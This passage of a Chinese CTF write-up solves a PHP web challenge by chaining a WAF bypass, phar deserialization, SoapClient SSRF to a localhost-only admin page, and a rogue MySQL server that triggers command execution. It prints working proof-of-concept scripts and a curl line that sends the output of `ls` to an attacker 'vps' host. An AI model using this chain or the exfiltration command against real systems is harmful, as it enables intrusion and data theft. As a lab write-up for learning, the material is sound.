        if(preg_match('/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i',$_POST['url'])){
            die("Go away!");//通过"GIF89a" . "__HALT_COMPILER();"绕waf
        }else{
            $file_path = $_POST['url'];  //获取路径，调用File类的getMIME方法返回图片类型
            $file = new File($file_path);
            //var_dump($file);
            $file->getMIME();
            echo "Your file type is '$file' ";
        }
    }
可以看到很多协议都被过滤掉了。先不讲方法，再接着看源码  
config.php
    cmd = $cmd;
            //var_dump($this->cmd);
            $this->clazz = $clazz;
            $this->func1 = $func1;
            $this->func2 = $func2;
            $this->func3 = $func3;
            $this->arg1 = $arg1;
            $this->arg2 = $arg2;
            $this->arg3 = $arg3;
        }
        function check(){
            $reflect = new ReflectionClass($this->clazz);
            $this->instance = $reflect->newInstanceArgs();
            $reflectionMethod = new ReflectionMethod($this->clazz, $this->func1);
            $reflectionMethod->invoke($this->instance, $this->arg1);
            $reflectionMethod = new ReflectionMethod($this->clazz, $this->func2);
            $reflectionMethod->invoke($this->instance, $this->arg2);
            $reflectionMethod = new ReflectionMethod($this->clazz, $this->func3);
            $reflectionMethod->invoke($this->instance, $this->arg3);
        }
        function __destruct(){
            system($this->cmd);
        }
    }
    if($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){
        if(isset($_POST['admin'])){
            $cmd = $_POST['cmd'];
            $clazz = $_POST['clazz'];
            $func1 = $_POST['func1'];
            $func2 = $_POST['func2'];
            $func3 = $_POST['func3'];
            $arg1 = $_POST['arg1'];
            $arg2 = $_POST['arg2'];
            $arg2 = $_POST['arg3'];
            $admin = new Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);
            $admin->check();
        }
    }
    else {
        echo "You r not admin!";
    }
我们看到命令执行的点，说明这是最终要达到的目的在这执行命令。  
class.php
    file_name=phar://phar.phar
            $this->file_name = $file_name;
        }
        function __wakeup(){//该类必须在反序列化后才能触发
            $class = new ReflectionClass($this->func);  //创建反射类，建立这个类(参数)的反射类  
            $a = $class->newInstanceArgs($this->file_name); //调用newInstanceArgs方法，相当于实例化类,相当于new SoapClient($this->file_name)
            // var_dump($this->file_name);
            $a->check();//调用不存在的check方法，发起soap请求，造成ssrf访问本地
        }
        function getMIME(){
            $finfo = finfo_open(FILEINFO_MIME_TYPE); //返回mime类型
            $this->type = finfo_file($finfo, $this->file_name);  //finfo_file触发phar反序列化
            //var_dump($this->type);
            finfo_close($finfo);
        }
        .....
看到一处命令执行，看样我们需要触发`__destruct()`方法从而执行命令，触发它也很简单只需要传参访问admin.php就行了，难点就是admin.php只能本地访问，只能往ssrf上想了。  
这里想到SoapClient反序列化，恰好这个File类又存在`__wakeup`函数，因此在反序列化时将会通过反射类机制实现类的实例化，并且调用类对象的`check`的函数，这里我们可以通过`$this->func=“SoapClient"`，`$this->file_name`为`new
SoapClient(null,payload)`中的payload传入即可，并且调用不存在的`check`函数，从而会调用SoapClient类中的`__call`方法，发起soap请求，这个知识点具体可以参考  
然后由文件上传我们可以想到上传一个phar文件，通过读取phar触发反序列化，然后发现在class.php中`getMIME()`方法调用一个`finfo_file()`，这个方法是可以触发phar反序列化的。  
**思路：**  
1.上传phar文件，通过`"GIF89a" . "__HALT_COMPILER();"`绕waf  
2.上传后访问phar文件，通过`php://filter/resource=phar://upload/.../..jpg`绕waf，从而触发反序列化  
3.触发后php对象SoapClient触发`__call`方法，调用我们构造好的数据包，发起soap请求从而造成ssrf访问本地执行命令。  
**poc.php**
    file_name  = [
                null,
                array('location' => $target,
                      'user_agent'=> str_replace('^^', "\r\n", 'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string),
                      'uri'=>'hello')
            ];
        }
    }
    $phar = new Phar('test.phar');
    $phar->startBuffering();
    $phar->addFromString('test.txt','test');
    $phar->setStub("GIF89a" . "__HALT_COMPILER();");
    $object = new File;
    $phar->setMetadata($object);
    $phar->stopBuffering();
    echo urlencode(serialize($object));
当然这个题解只是非预期解，因为在admin.php中触发命令执行的析构函数`__destruct`，会在程序执行结束销毁对象后执行一次，所以在造成ssrf会自动命令执行，而出题师傅想考的是mysql服务伪造，客户端读取文件触发反序列化造成命令执行，所以将`__destruct`改为了`__wakeup`函数。
**预期解思路：**  
这里将环境中`__destruct`改为了`__wakeup`函数。  
步骤和上面大致一样：  
1.上传phar文件，通过`"GIF89a" . "__HALT_COMPILER();"`绕waf  
2.上传后访问phar文件，通过`php://filter/resource=phar://upload/.../..jpg`绕waf，从而触发反序列化  
3.触发后php对象SoapClient触发`__call`方法，调用我们构造好的数据包，发起soap请求从而造成ssrf访问本地，但现在是不会执行命令的，中间有个细节，此时调用admin.php中check方法mysql客户端执行任意语句读取phar文件内容触发反序列化执行`__wakeup`函数造成命令执行。但要注意的是这个phar文件并不是上一个，当然可以放在一块上传，这里触发的是admin.php中的Ad类，只有反序列化Ad对象才会触发Ad类中的`__wakeup`方法执行命令，也就是说整个过程共有两次反序列化。
将上面poc中的`$post_string`修改
    $post_string = 'admin=1&cmd=curl "vps:8123" -d `ls`&clazz=Mysqli&func1=init&arg1=&func2=real_connect&arg2[0]=vps&arg2[1]=root&arg2[2]=root&arg2[3]=test&arg2[4]=3307&func3=query&arg3=select%201';
它对应admin.php中的(源码有改动，github里为题目源码)
    function check(){
            $reflect = new ReflectionClass($this->clazz); //Mysqli
            $this->instance = $reflect->newInstanceArgs(); //创建Mysqli对象
            $reflectionMethod = new ReflectionMethod($this->clazz, $this->func1);//Mysqli init
            $reflectionMethod->invoke($this->instance, $this->arg1);
            //相当于调用Mysqli类中的init方法，传参arg1
            $reflectionMethod = new ReflectionMethod($this->clazz, $this->func2);//Mysqli real_connect
            $reflectionMethod->invoke($this->instance, $this->arg2[0], $this->arg2[1], $this->arg2[2], $this->arg2[3], $this->arg2[4]);
            //传参arg2[0]=vps&arg2[1]=root&arg2[2]=123&arg2[3]=test&arg2[4]=3307
            $reflectionMethod = new ReflectionMethod($this->clazz, $this->func3);//Mysqli query
            $reflectionMethod->invoke($this->instance, $this->arg3);//select%201  触发反序列化
相当于，在前面讲过的
    $m = new mysqli();
    $m->init(); 
    $m->real_connect('ip','数据库账号','数据库密码','数据库',3306); 
    $m->query('select 1;')//执行的sql语句
poc2.php
    cmd = $cmd;
    }
    }
    $phar = new Phar("phar3.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("GIF89a" . "__HALT_COMPILER();"); //设置stub
    $cmd='curl "vps:8123" -d `ls`';
    $o = new Ad($cmd);
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); 
        //签名自动计算
    $phar->stopBuffering();
然后用上面那个mysql服务伪造的项目，就是上面这个脚本生成的phar ，将这个上传上去，读取文件为phar://./upload/xxxx，监听端口。  
我这里用的项目也是网上一位师傅写的，上面github那个也行。
    #coding=utf-8 
    import socket
    import logging
    logging.basicConfig(level=logging.DEBUG)
    #@输出内容
    #λ python rogue_mysql_server4.py
    #INFO:root:Conn from: ('127.0.0.1', 54329)
    #INFO:root:auth okay
    #INFO:root:want file...
    #INFO:root:§  ☻admin:111   ♥
    filename="phar://./upload/18ef1db49e789cf6d6fab4663bd7b8e4/fa989130adeb8e5fff543fc55c13cc08.gif"  #修改文件路径
    sv=socket.socket()
    sv.bind(("",3307))  #修改端口随意，要和前面脚本数据库端口一致
    sv.listen(5)
    conn,address=sv.accept()
    logging.info('Conn from: %r', address)
    conn.sendall("\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00")
    conn.recv(9999)
    logging.info("auth okay")
    conn.sendall("\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")
    conn.recv(9999)
    logging.info("want file...")
    wantfile=chr(len(filename)+1)+"\x00\x00\x01\xFB"+filename
    conn.sendall(wantfile)
    content=conn.recv(9999)
    logging.info(content)
    conn.close()
## 文末
之前对phar反序列化和mysql客户端读取文件原理一直很模糊不清，通过了解原理以及将两者结合去实践后才算对这两个知识点有了较为熟悉的认识。
参考文章：  